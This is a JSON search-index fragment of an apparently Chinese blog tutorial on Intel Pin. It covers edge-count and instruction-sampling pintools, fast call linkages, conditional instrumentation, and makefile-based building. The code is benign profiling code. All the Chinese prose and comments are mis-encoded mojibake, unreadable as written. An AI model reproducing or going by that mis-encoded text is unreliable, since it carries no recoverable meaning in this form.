ï¼Œé¿å…å¯¹æ‰€æœ‰ç±»å‹çš„æŒ‡ä»¤éƒ½ç¬¼ç»Ÿåœ°è°ƒç”¨æ€§èƒ½è¦æ±‚é«˜docount2 å‡½æ•°ã€‚ æœ€ç»ˆå®ç°çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š /*! @file * This file contains an ISA-portable PIN tool for tracing instructions */ #include \u003ciostream\u003e #include \u003cfstream\u003e #include \u003cmap\u003e #include \u003cunistd.h\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::map; using std::pair; using std::string; /* ===================================================================== */ /* Commandline Switches */ /* ===================================================================== */ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"edgcnt.out\", \"specify trace file name\"); KNOB\u003c INT32 \u003e KnobFilterByHighNibble(KNOB_MODE_WRITEONCE, \"pintool\", \"f\", \"-1\", \"only instrument instructions with a code address matching the filter\"); KNOB\u003c BOOL \u003e KnobPid(KNOB_MODE_WRITEONCE, \"pintool\", \"i\", \"0\", \"append pid to output\"); /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ static INT32 Usage() { cerr \u003c\u003c \"This pin tool collects an edge profile for an application\\n\"; cerr \u003c\u003c \"The edge profile is partial as it only considers control flow changes (taken\\n\"; cerr \u003c\u003c \"branch edges, etc.). It is the left to the profile consumer to compute the missing counts.\\n\"; cerr \u003c\u003c \"\\n\"; cerr \u003c\u003c \"The pin tool *does* keep track of edges from indirect jumps within, out of, and into\\n\"; cerr \u003c\u003c \"the application. Traps to the OS a recorded with a target of -1.\\n\"; cerr \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Global Variables */ /* ===================================================================== */ class COUNTER { public: UINT64 _count; // è¾¹ç•Œåˆ°è¾¾çš„æ¬¡æ•°ï¼Œè®¡æ•°å™¨ COUNTER() : _count(0) {} }; typedef enum { ETYPE_INVALID, ETYPE_CALL, ETYPE_ICALL, ETYPE_BRANCH, ETYPE_IBRANCH, ETYPE_RETURN, ETYPE_SYSCALL, ETYPE_LAST } ETYPE; class EDGE { public: ADDRINT _src; ADDRINT _dst; ADDRINT _next_ins; ETYPE _type; // å¿…é¡»ä¸ºæ•´æ•°å½¢å¼ EDGE(ADDRINT s, ADDRINT d, ADDRINT n, ETYPE t) : _src(s), _dst(d), _next_ins(n), _type(t) {} bool operator\u003c(const EDGE\u0026 edge) const { return _src \u003c edge._src || (_src == edge._src \u0026\u0026 _dst \u003c edge._dst); } }; string StringFromEtype(ETYPE etype) { switch (etype) { case ETYPE_CALL: return \"C\"; case ETYPE_ICALL: return \"c\"; case ETYPE_BRANCH: return \"B\"; case ETYPE_IBRANCH: return \"b\"; case ETY","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.3 Eliminating Control Flow ä¸Šé¢æ–°å¢çš„docunt()å‡½æ•°çš„ä»£ç ååˆ†ç®€æ´ï¼Œæå¤§åœ°æå‡äº†æ€§èƒ½ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥è¢«Pinå†…è”ï¼Œè¿›ä¸€æ­¥é¿å…å‡½æ•°è°ƒç”¨çš„å¼€é”€ã€‚ ä½†æ˜¯ç°åœ¨çš„docount()å‡½æ•°ä¸­å­˜åœ¨æ§åˆ¶æµï¼Œè¿™æœ‰å¯èƒ½åœ¨è¿›è¡Œå†…è”æ—¶å‘ç”ŸæœªçŸ¥çš„æ”¹å˜ã€‚æœ€å¥½çš„è§£å†³åŠæ³•æ˜¯å»æ‰å‡½æ•°ä¸­çš„æ§åˆ¶æµï¼Œè¿™æ ·è¿›è¡Œå†…è”æ—¶å¯ä»¥ä¿è¯å¥å£®æ€§ã€‚ è€ƒè™‘åˆ°docount()å‡½æ•°çš„â€™takenâ€™å‚æ•°è¦ä¹ˆä¸º0ï¼Œè¦ä¹ˆä¸º1ï¼Œæ‰€ä»¥å¯ä»¥å°†å‡½æ•°ä»£ç ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š VOID docount( COUNTER *pedg, INT32 taken ) { pedg-\u003e_count += taken; } å¦‚æ­¤ä¿®æ”¹åï¼Œdocunt()å‡½æ•°å°±å¯ä»¥è¿›è¡Œå†…è”äº†ï¼Œå¹¶ä¸”å¯ä»¥ä¿è¯å‡½æ•°çš„å¥å£®æ€§ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:3","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.4 Letting Pin Decide Where to Instrument åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸å…³å¿ƒå…·ä½“åœ¨ä»€ä¹ˆä½ç½®è¿›è¡Œæ’æ¡©ï¼Œåªè¦ä¿è¯æ’æ¡©ä»£ç ä½äºåŸºæœ¬å—å†…éƒ¨å³å¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ’æ¡©ä½ç½®çš„é€‰æ‹©æƒäº¤ç»™Pinè‡ªèº«ï¼ŒPinå¯ä»¥é€‰æ‹©éœ€è¦æœ€å°‘å¯„å­˜å™¨è¿›è¡Œä¿å­˜å’Œæ¢å¤çš„æ’å…¥ç‚¹ï¼Œæå‡æ€§èƒ½ã€‚ ä¸€ä¸ªæ ·ä¾‹å¦‚ä¸‹ï¼š #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // è®°å½•è¿è¡Œçš„æŒ‡ä»¤çš„æ•°é‡ï¼Œè®¾ç½®ä¸ºé™æ€å˜é‡æ–¹ä¾¿ç¼–è¯‘å™¨ä¼˜åŒ–docountå‡½æ•° static UINT64 icount = 0; // åœ¨æ¯ä¸ªå—ä¹‹å‰è°ƒç”¨è¯¥å‡½æ•° // å¯¹callsä½¿ç”¨fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } // Pinåœ¨é‡åˆ°ä¸€ä¸ªæ–°å—æ—¶è°ƒç”¨ï¼Œæ’å…¥å¯¹docount å‡½æ•°çš„è°ƒç”¨ VOID Trace(TRACE trace, VOID* v) { // æ£€æŸ¥traceä¸­çš„æ¯ä¸ªåŸºæœ¬å— for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // å¯¹æ¯ä¸ªbblæ’å…¥å¯¹docountå‡½æ•°çš„è°ƒç”¨ï¼Œå°†æŒ‡ä»¤æ•°é‡ä½œä¸ºå‚æ•°ä¼ é€’ // IPOINT_ANYWHEREå‚æ•°å…è®¸Pinåœ¨bblå†…éƒ¨ä»»æ„ä½ç½®æ’å…¥callä»¥è·å–æœ€å¥½çš„æ€§èƒ½ // å¯¹callä½¿ç”¨fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // ç¨‹åºé€€å‡ºæ—¶è°ƒç”¨ VOID Fini(INT32 code, VOID* v) { OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // åˆå§‹åŒ–Pin if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // æ³¨å†Œæ’æ¡©å‡½æ•°Trace TRACE_AddInstrumentFunction(Trace, 0); // æ³¨å†ŒFiniå‡½æ•° PIN_AddFiniFunction(Fini, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } è¿™é‡ŒIPOINTæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œå†³å®šäº†åˆ†æcallè¢«æ’å…¥åˆ°ä»€ä¹ˆåœ°æ–¹ã€‚æ’å…¥çš„å¯¹è±¡å¯ä»¥æ˜¯ï¼šINSï¼ŒBBLï¼ŒTRACEï¼ŒRTNï¼Œå…¶å®Œæ•´å¯ç”¨çš„å€¼å¦‚ä¸‹ï¼š IPOINT_BEFOREï¼šåœ¨æ’æ¡©å¯¹è±¡çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¹‹å‰æ’å…¥callï¼Œæ€»æ˜¯æœ‰æ•ˆ IPOINT_AFTERï¼šåœ¨æ’æ¡©å¯¹è±¡çš„æœ€åä¸€æ¡æŒ‡ä»¤çš„å¤±è´¥è·¯å¾„å¤„æ’å…¥call å¦‚æœæ˜¯routineï¼ˆRTNï¼‰ï¼Œåœ¨æ‰€æœ‰è¿”å›è·¯å¾„å¤„æ’æ¡© å¦‚æœæ˜¯instructionï¼ˆINSï¼‰ï¼Œä»…åœ¨INS_IsValidForIpointAfter()å‡½æ•°ä¸ºçœŸçš„æƒ…å†µä¸‹é€‚ç”¨ å¦‚æœæ˜¯BBLï¼Œä»…åœ¨BBL_HasFallThrough()å‡½æ•°ä¸ºçœŸçš„æƒ…å†µä¸‹é€‚ç”¨ å¦‚æœæ˜¯TRACEï¼Œä»…åœ¨TRACE_HasFallThrough()å‡½æ•°ä¸ºçœŸçš„æƒ…å†µä¸‹é€‚ç”¨ IPOINT_ANYWHEREï¼šåœ¨æ’æ¡©å¯¹è±¡çš„ä»»æ„ä½ç½®æ’å…¥callï¼Œä¸é€‚ç”¨INS_InsertCall()å’ŒINS_InsertThenCall()å‡½æ•° IPOINT_TAKEN_BRANCHï¼šåœ¨æ’æ¡©å¯¹è±¡çš„æ§åˆ¶æµçš„æ‰§è¡Œè¾¹ç•Œå¤„æ’å…¥callï¼Œä»…é€‚ç”¨äºINS_IsValidForIpointTakenBranch()è¿”å›çœŸçš„æƒ…å†µã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:4","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.5 Using Fast Call Linkages å¯¹äºä¸€äº›æ¯”è¾ƒâ€œå°â€çš„å‡½æ•°æ¥è¯´ï¼Œå¯¹å‡½æ•°çš„è°ƒç”¨å¼€é”€æœ‰æ—¶ä¸å‡½æ•°è‡ªèº«çš„è¿ç®—å¼€é”€åŸºæœ¬ç›¸åŒï¼Œå› æ­¤ä¸€äº›ç¼–è¯‘å™¨ä¼šæä¾›ä¸€äº›è°ƒç”¨é“¾æ¥ä¼˜åŒ–æœºåˆ¶æ¥é™ä½å¼€é”€ã€‚ä¾‹å¦‚ï¼ŒIA-32ä¸‹çš„gccæœ‰ä¸€ä¸ªåœ¨å¯„å­˜å™¨ä¸­ä¼ é€’å‚æ•°çš„regparmå±æ€§ã€‚ Pinä¸­æœ‰ä¸€å®šæ•°é‡çš„å¤‡ç”¨é“¾æ¥ï¼Œä½¿ç”¨PIN_FAST_ANALYSIS_CALLæ¥å£°æ˜åˆ†æå‡½æ•°å³å¯ä½¿ç”¨ï¼Œè€Œæ’æ¡©å‡½æ•°InsertCallåˆ™éœ€è¦ä½¿ç”¨IARG_FAST_ANALYSIS_CALLã€‚å¦‚æœäºŒè€…åªæ›´æ”¹äº†ä¸€ä¸ªï¼Œé‚£ä¹ˆå°±å¯èƒ½å‡ºç°ä¼ å‚é”™è¯¯ã€‚ä¾‹å¦‚å‰é¢ç»™å‡ºçš„æºç ä¾‹å­å°±ä½¿ç”¨äº†fast call linkagesï¼š ... ... // å¯¹åˆ†æå‡½æ•°ä½¿ç”¨fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } VOID Trace(TRACE trace, VOID* v) { // æ£€æŸ¥traceä¸­çš„æ¯ä¸ªåŸºæœ¬å— for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // å¯¹æ’æ¡©å‡½æ•°ä½¿ç”¨fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } ... ... åœ¨å¯¹æ¯”è¾ƒå¤æ‚çš„å¤§å‹å‡½æ•°ä½¿ç”¨è¯¥æ–¹æ³•æ—¶ï¼Œæ•ˆæœå¹¶ä¸æ˜æ˜¾ï¼Œä½†ä¸ä¼šé€ æˆæ€§èƒ½çš„ä¸‹é™ã€‚ ç¬¬äºŒä¸ªè°ƒç”¨é“¾æ¥ä¼˜åŒ–æ˜¯æ¶ˆé™¤å¸§æŒ‡é’ˆã€‚å¦‚æœä½¿ç”¨gccï¼Œåˆ™æ¨èåŠ ä¸Š\"-fomit-frame-pointer\"é€‰é¡¹ã€‚Pinå®˜æ–¹çš„æ ‡å‡†Pintoolçš„makefileåŒ…æ‹¬è¯¥é€‰é¡¹ã€‚ä¸PIN_FAST_ANALYSIS_CALLä¸€æ ·ï¼Œè¯¥é€‰é¡¹å¯¹â€œå°â€å‡½æ•°çš„æ•ˆæœæ¯”è¾ƒæ˜æ˜¾ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdebuggerä¼šæ ¹æ®å¸§æŒ‡é’ˆæ¥æ˜¾ç¤ºå †æ ˆå›æº¯æƒ…å†µï¼Œæ‰€ä»¥å¦‚æœæƒ³è°ƒè¯•Pintoolçš„è¯ï¼Œå°±ä¸è¦è®¾ç½®è¯¥é€‰é¡¹ã€‚å¦‚æœä½¿ç”¨æ ‡å‡†çš„Pintoolçš„makefileæ¥è¿›è¡Œå˜å¼‚ï¼Œåˆ™å¯ä»¥é€šè¿‡ä¿®æ”¹OPTé€‰é¡¹æ¥è¿›è¡Œæ”¹å˜ï¼š make OPT=-O0 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:5","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.6 Rewriting Conditional Analysis Code to Help Pin Inline Piné€šè¿‡è‡ªåŠ¨å†…è”æ²¡æœ‰æ§åˆ¶æµå˜åŒ–çš„åˆ†æroutineæ¥æå‡æ’æ¡©æ€§èƒ½ã€‚ä½†æ˜¯æœ‰å¾ˆå¤šåˆ†æroutineæ˜¯æœ‰æ§åˆ¶æµçš„ï¼Œæœ€å…¸å‹çš„å°±æ˜¯æœ‰ä¸€ä¸ªç®€å•çš„â€œif-thenâ€çš„æ¡ä»¶è¯­å¥ï¼Œå®ƒåªä¼šæ‰§è¡Œå°‘é‡çš„åˆ†æä»£ç ï¼Œå¹¶â€œthenâ€éƒ¨åˆ†åªæ‰§è¡Œä¸€æ¬¡ã€‚ä¸ºäº†å°†è¿™ç±»çš„è¯­å¥è½¬æ¢ä¸ºå¸¸è§„çš„æ²¡æœ‰æ§åˆ¶æµå˜åŒ–çš„è¯­å¥ï¼ŒPinæä¾›äº†ä¸€äº›æ’æ¡©APIæ¥é‡å†™åˆ†æroutineã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªé‡å†™çš„ä¾‹å­ï¼š ä¾‹å¦‚æˆ‘ä»¬å½“å‰æƒ³è¦å®ç°çš„ä¸€ä¸ªåˆ†æroutineçš„ä»£ç å¦‚ä¸‹ï¼š // IP-samplingåˆ†æroutineå®ç°: VOID IpSample(VOID *ip) { --icount; if (icount == 0) { fprintf(trace, \"%p\\n\", ip); icount = N + rand() % M; } } åœ¨åŸå§‹çš„IpSample()å‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ¡ä»¶è¯­å¥ï¼Œä¼šå­˜åœ¨æ§åˆ¶æµçš„å˜åŒ–ã€‚å¦‚ä½•æ¶ˆé™¤è¯¥æ¡ä»¶æ§åˆ¶æµçš„å­˜åœ¨å‘¢ï¼Ÿ å¯ä»¥çœ‹åˆ°åˆ†æroutineå†…éƒ¨å…¶å®å¯ä»¥æ‹†è§£ä¸º2éƒ¨åˆ†åŠŸèƒ½ï¼šicountçš„è‡ªå‡å’Œâ€œifâ€è¯­å¥ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ä¸¤ä¸ªå•ç‹¬çš„å‡½æ•°å®ç°ã€‚è€Œä¸”ï¼Œå‰è€…æ¯”åè€…çš„æ‰§è¡Œé¢‘ç‡è¦æ›´é«˜ã€‚æ‹†è§£åçš„ä»£ç å¦‚ä¸‹ï¼š /* * IP-samplingåˆ†æroutineå®ç°: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // è®¡ç®—icount ADDRINT CountDown() { --icount; return (icount == 0); } // æ‰“å°å½“å‰æŒ‡ä»¤çš„IPå¹¶ä¸”icountè¢«é‡ç½®ä¸ºNå’ŒN+Mä¸­çš„ä¸€ä¸ªéšæœºæ•° VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // å‡†å¤‡ä¸‹æ¬¡è®¡ç®— icount = N + rand() % M; } ä¸€ä¸ªå®Œæ•´çš„å®ç°æ¶ˆé™¤æ§åˆ¶æµå˜åŒ–çš„ä»£ç å¦‚ä¸‹ï¼š /* source/tools/ManualExamples/isampling.cpp */ #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \"pin.H\" FILE* trace; const INT32 N = 100000; const INT32 M = 50000; INT32 icount = N; /* * IP-samplingåˆ†æroutineå®ç°: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // è®¡ç®—icount ADDRINT CountDown() { --icount; return (icount == 0); } // æ‰“å°å½“å‰æŒ‡ä»¤çš„IPå¹¶ä¸”icountè¢«é‡ç½®ä¸ºNå’ŒN+Mä¸­çš„ä¸€ä¸ªéšæœºæ•° VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // å‡†å¤‡ä¸‹æ¬¡è®¡ç®— icount = N + rand() % M; } VOID Instruction(INS ins, VOID* v) { // æ¯æ¡æŒ‡ä»¤æ‰§è¡Œåéƒ½ä¼šè°ƒç”¨CountDown() INS_InsertIfCall(ins, IPOINT_BEFORE, (AFUNPTR)CountDown, IARG_END); // åªæœ‰å½“CountDownè¿”å›é0å€¼æ—¶æ‰ä¼šè°ƒç”¨PrintIp() INS_InsertThenCall(ins, IPOINT_BEFORE, (AFUNPTR)PrintIp, IARG_INST_PTR, IARG_END); } VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool samples the IPs of instruction executed\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { trace = fopen(\"isampling.out\", \"w\"); if (PIN_Init(argc, argv)) return Usage(); INS_AddInstrumentFunction(Instruction, 0); PIN_StartProgram(); return 0; } ä½¿ç”¨æ¡ä»¶æ’æ¡©API INS_InsertIfCall()å’ŒINS_InsertThenCall()æ¥å‘Šè¯‰Pinåªæœ‰å½“CountDown()æ‰§è¡Œç»“æœé0æ—¶ï¼Œæ‰æ‰§è¡ŒPrintIp()ã€‚è¿™æ ·ä¸€æ¥ï¼ŒCountDown()å‡½æ•°å°±å¯ä»¥å†…è”åœ¨Pinä¸­ï¼Œå¯¹äºæ²¡æœ‰å†…è”çš„PrintIp()åˆ™åªæœ‰åœ¨æ»¡è¶³æ¡ä»¶æ—¶æ‰ä¼šæ‰§è¡Œä¸€æ¬¡ã€‚ INS_InsertThenCall()æ’è¿›å»çš„å‡½æ•°åªæœ‰åœ¨INS_InsertIfCall()æ’è¿›å»çš„å‡½æ•°è¿”å›é0å€¼æ—¶æ‰ä¼šæ‰§è¡Œã€‚è¿™ä¸ªåŠŸèƒ½å¯ä»¥è¯´æ˜¯ä¸€ä¸ªååˆ†å·§å¦™çš„åŠŸèƒ½ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:6","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"8. Building Your Own Tool åœ¨å¼€å‘è‡ªå·±çš„Pintoolæ—¶ï¼Œå¯ä»¥copyä¸€ä»½exampleç›®å½•ï¼Œ ç„¶ååœ¨makefile.rulesæ–‡ä»¶ä¸­æ·»åŠ ä¸Šè‡ªå·±çš„toolï¼Œå¯ä»¥ä»¥æœ€ç®€å•çš„MyPinToolä¸ºæ¨¡ç‰ˆã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:5:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"8.1 Building a Tool From Within the Kit Directory Tree å¦‚æœç›´æ¥ä¿®æ”¹MyPinToolï¼Œå¹¶ä¸”æ²¡æœ‰ç‰¹æ®Šçš„ç¼–è¯‘éœ€æ±‚ï¼Œåˆ™ç›´æ¥ä½¿ç”¨é»˜è®¤é…ç½®å°±å¥½ã€‚å¦‚æœè¦æ–°å¢toolæˆ–è€…éœ€è¦æŒ‡å®šç‰¹æ®Šçš„æ„å»ºæ ‡å¿—ï¼Œåˆ™éœ€è¦ä¿®æ”¹makeifile.rulesæ–‡ä»¶ã€‚ æ„å»ºYourTool.so(æºæ–‡ä»¶ä¸ºYourTool.cpp)ï¼š make obj-intel64/YourTool.so å¦‚æœæƒ³ç¼–è¯‘æˆIA-32æ¶æ„ï¼Œåˆ™ä½¿ç”¨â€œobj-ia32â€æ›¿æ¢â€œobj-intel64â€å³å¯ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:5:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"8.2 Building a Tool Out of the Kit Directory Tree copyæ–‡ä»¶å¤¹MyPinToolåˆ°æŒ‡å®šä½ç½®å­ï¼Œç„¶åç¼–è¾‘makefile.rulesæ–‡ä»¶ã€‚ make PIN_ROOT=\u003cpath to Pin kit\u003e obj-intel64/YourTool.so è¦æ›´æ”¹å°†åˆ›å»ºå·¥å…·çš„ç›®å½•ï¼Œå¯ä»¥ä»å‘½ä»¤è¡Œè¦†ç›– OBJDIR å˜é‡ï¼š make PIN_ROOT=\u003cpath to Pin kit\u003e OBJDIR=\u003cpath to output dir\u003e \u003cpath to output dir\u003e/YourTool.so ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:5:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9. Pinâ€™s makefile Infrastructure ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.1 The Config Directory ç›®å½•source/tools/Configä¸­å­˜æ”¾äº†makeé…ç½®çš„åŸºæœ¬æ–‡ä»¶ï¼Œä¸è¦è½»æ˜“ä¿®æ”¹è¿™äº›æ–‡ä»¶ï¼Œå¯ä»¥åŸºäºå…¶ä¸­çš„æ¨¡ç‰ˆæ–‡ä»¶è¿›è¡Œæ›´æ–°ã€‚ ä¸‹é¢å¯¹å…¶ä¸­çš„å‡ ä¸ªå…³é”®æ–‡ä»¶è¿›è¡Œè¯´æ˜ï¼š makefile.configï¼šåœ¨includeé“¾ä¸­ç¬¬ä¸€ä¸ªåº”è¯¥includeçš„æ–‡ä»¶ã€‚å®ƒä¿å­˜äº†ç”¨æˆ·å¯ç”¨çš„æ‰€æœ‰ç›¸å…³æ ‡è¯†å’Œå˜é‡çš„æ–‡æ¡£ï¼Œæ­¤å¤–è¿˜åŒ…æ‹¬ç‰¹å®šäºOSçš„é…ç½®æ–‡ä»¶ã€‚ unix.varsï¼šè¯¥æ–‡ä»¶åŒ…å«makefileä½¿ç”¨çš„ä¸€äº›æ¶æ„å˜é‡å’Œå®ç”¨ç¨‹åºçš„Unixå®šä¹‰ã€‚ makefile.default.rulesï¼šè¯¥æ–‡ä»¶åŒ…å«é»˜è®¤çš„makeç›®æ ‡ã€æµ‹è¯•ç”¨ä¾‹å’Œæ„å»ºè§„åˆ™ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.2 The Test Directories source/toolsç›®å½•ä¸‹çš„æ¯ä¸ªæµ‹è¯•æ€§è´¨çš„ç›®å½•ä¸­éƒ½åŒ…å«makefileé“¾ä¸­çš„ä¸¤ä¸ªæ–‡ä»¶ï¼š makefileï¼šè¿è¡Œmakeæ—¶è°ƒç”¨ï¼Œä¸è¦ä¿®æ”¹ã€‚å…¶ä¸­ä¿å­˜äº†makefileé“¾çš„æ‰€æœ‰ç›¸å…³é…ç½®æ–‡ä»¶çš„åŒ…å«æŒ‡ä»¤ï¼Œå±äºé€šç”¨æ–‡ä»¶ï¼Œåœ¨æ‰€æœ‰çš„æµ‹è¯•ç›®å½•ä¸­éƒ½æ˜¯ç›¸åŒçš„ã€‚ makefile.rulesï¼šç›®å½•ç‰¹å®šæ–‡ä»¶ï¼Œä¸åŒæµ‹è¯•ç›®å½•ï¼Œæ–‡ä»¶å†…å®¹ä¸åŒã€‚å®ƒä¿å­˜äº†å½“å‰ç›®å½•çš„é€»è¾‘ï¼Œåº”è¯¥åœ¨ç›®å½•ä¸­æ„å»ºå’Œè¿è¡Œçš„æ‰€æœ‰å·¥å…·ã€åº”ç”¨ç¨‹åºå’Œæµ‹è¯•ç­‰éƒ½åœ¨è¯¥æ–‡ä»¶ä¸­è¿›è¡Œå®šä¹‰ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.3 Adding Tests, Tools and Applications to the makefile 